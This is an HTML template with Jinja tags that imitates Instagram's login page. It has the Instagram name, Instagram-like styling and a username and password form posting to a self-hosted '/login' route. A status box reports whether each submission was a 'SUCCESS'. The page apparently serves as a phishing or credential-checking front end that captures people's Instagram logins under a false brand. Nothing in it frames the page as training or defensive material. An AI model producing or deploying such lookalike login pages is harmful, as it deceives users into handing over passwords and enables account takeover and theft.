<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
            width: 350px;
            text-align: center;
        }
        .logo {
            font-size: 24px;
            font-weight: 600;
            color: #0095f6;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 12px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 4px;
            cursor: pointer;
            font-weight: 600;
            font-size: 14px;
        }
        button:hover {
            background-color: #1877f2;
        }
        .status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 4px;
            font-size: 14px;
        }
        .success { background-color: #d1fae5; color: #065f46; }
        .failure { background-color: #fee2e2; color: #991b1b; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">Instagram</div>
        <form action="/login" method="post">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        {% if result %}
        <div class="status {% if 'SUCCESS' in result %}success{% else %}failure{% endif %}">
            {{ result }}
        </div>
        {% endif %}
    </div>
</body>
</html>
